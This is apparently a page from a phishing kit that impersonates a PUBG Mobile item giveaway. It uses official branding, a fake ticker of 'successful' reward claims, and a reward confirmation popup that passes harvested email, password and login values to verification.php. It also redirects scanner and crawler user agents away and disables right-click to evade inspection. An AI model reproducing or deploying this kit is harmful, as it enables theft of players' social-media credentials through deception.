<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html><!-- t.me/JefanyaStore -->
<head><!-- t.me/JefanyaStore -->
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content=" Silvanus X-Suit">
<meta name="description" content="Warrior of Legends Hit the Front Lines">
<meta property="og:description" content="Warrior of Legends Hit the Front Lines">
<meta property="og:url" content="./">
<meta property="og:site_name" content=" Silvanus X-Suit">
<meta property="og:type" content="website">
<meta name="copyright" content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="../img/kv_logo.jpg">
<title> Silvanus X-Suit</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="containerHome rewardsBox">
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<br>
<span>The original Battle Royale, <br> the first and the best!</span>
</div> 
<div class="navbar-download">
<img class="navbar-pay" src="https://www.gungratech.com/img/pay.png">
</div> 
</div> 
<div class="headernamek">
<video src="media/header1.mp4" autoplay loop muted></video>
</div> 
<div class="box">
<center>
<div class="" style="background: url(img/Nameksub.png) no-repeat center;background-size: 100% 100%;width: 100%;height: 50px">
<center><font style="font-size: 18px;color: #866d6b;position:absolute;left: 18%;top: 1.2%"></font></center>
</div>
<div class="alert-wrapper">
<div class="alert">
<div class="alert-time">
<div id="timer1"></div>
</div>
<div class="slider animated fadeIn">!ID 5883485429 Successful Get 3 Material </div>
<div class="slider animated fadeIn">!ID 5295893347 Successful Get 5 Material</div>
<div class="slider animated fadeIn">!ID 5963737318 Successful Get 10 Material </div>
<div class="slider animated fadeIn">!ID 5888686451 Successful Get 20 material X-Suit</div>
<div class="slider animated fadeIn">!ID 51550305574 Successful Get 3 Material</div>
<div class="slider animated fadeIn">!ID 5463336783 Successful Get 330 material x-Suit </div>
<div class="slider animated fadeIn">!ID 5656786904 Successful Get 10 Material </div>
<div class="slider animated fadeIn">!ID 5446017595 Successful Get 5 Material</div>
</div>
</div> 
<div class="tab_rewards" id="latest">
<div class="item">
<div>
<img style="border-bottom: 0px;" src="img/reward/1.png">
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/1.png">100</button>
</div>
</div>
<div class="item">
<div>
<img style="border-bottom: 0px;" src="img/reward/2.png">
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/2.png">260</button>
</div>
</div>
<div class="item">
<div>
<img style="border-bottom: 0px;" src="img/reward/3.png">
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/3.png">420</button>
</div>
</div>
<div class="item">
<div>
<img style="border-bottom: 0px;" src="img/reward/4.png">
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/4.png">540</button>
</div>
</div>
<div class="item">
<div>
<img style="border-bottom: 0px;" src="img/reward/5.png">
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/5.png">670</button>
</div>
</div>
<div class="item">
<div>
<img style="border-bottom: 0px;" src="img/reward/6.png">
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/6.png">2535</button>
</div>
</div>
</div>
</center>
<div class="twitter-content">
<p class="awalbtn"><i></i>TWITTER</p>
<p class="com_main">
<a class="twitter-timeline" href="https://twitter.com/PUBGMOBILE" data-theme="dark" data-height="inherit" data-chrome="noheader nofooter" onclick="gtag('event', 'x_click', {'event_category': 'website','event_label': 'pc_par_community_twitter'});"></a>
</p>
</div>
</div>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
<a href="#" class="btn-top"></a>
</div>
</section>
<div class="dialog">
<div class="pop pop1" id="pop1">
<div>
</div> 
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> 
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://www.gungratech.com/img/footer_img.png">
<div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div> 
<div class="footer-txt-copyright">ⓒ 2018-2021 Tencent. All rights reserved.</div> 
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> 
</div> 
</div> 
<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title">Reward Confirmation</div></div>
<div class="popup-alert">Are you sure to COLLECT this reward?</div>
<img class="popup-item" src="" id="myRewardImg">
<div class="popup-btn-wrapper">
<button type="button" onmousedown="tutup.play();" class="popup-btn-deactive" onclick="close_reward_confirmation()">Cancel</button>
<form action="verification.php" method="post">
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
<button type="submit" class="popup-btn-active">Exchange</button>
</div>
</form>
</div>
</div>
<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/timer.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>
<script src="js/slider.js"></script>
<script>
// show hide password for facebook
function showFbPassword() {
  var x = document.getElementById("fbPassword");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("fbPassword");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("twitterPassword");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("twitterPassword");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}
</script>
</body>
</html>